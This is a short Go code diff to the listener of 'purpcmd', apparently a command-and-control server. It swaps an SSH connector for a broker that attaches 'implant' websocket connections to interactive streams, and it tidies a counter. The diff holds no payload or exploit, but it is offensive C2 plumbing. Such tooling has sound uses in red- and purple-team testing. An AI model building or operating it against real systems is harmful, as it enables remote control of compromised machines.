@@ -9,8 +9,8 @@ import (
 
 	"purpcmd/internal"
 	"purpcmd/server/callback"
+	"purpcmd/server/interactive"
 	"purpcmd/server/log"
-	"purpcmd/server/ssh"
 	"purpcmd/server/utils"
 
 	"github.com/gorilla/websocket"
@@ -27,10 +27,12 @@ func (l *Listener) root(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 
-		webSockConn := utils.New(conn) // New addapter
-		log.AsyncWriteStdoutInfo("initiating interactive session")
-		ssh.Connector(webSockConn)
-
+		webSockConn := utils.New(conn)
+		log.AsyncWriteStdoutInfo("implant connected to interactive stream broker")
+		if err := interactive.Default.AttachImplant(r.URL.Query().Get("stream"), webSockConn); err != nil {
+			log.AsyncWriteStdoutErr(err.Error())
+			_ = webSockConn.Close()
+		}
 		return
 	}
 
@@ -51,7 +53,7 @@ func (l *Listener) root(w http.ResponseWriter, r *http.Request) {
 		w.Write([]byte("Page Not Found"))
 		return
 	} else if uint16(a) == internal.REG {
-		l.Association = l.Association + 1
+		l.incrementAssociation()
 	}
 
 	w.WriteHeader(200)
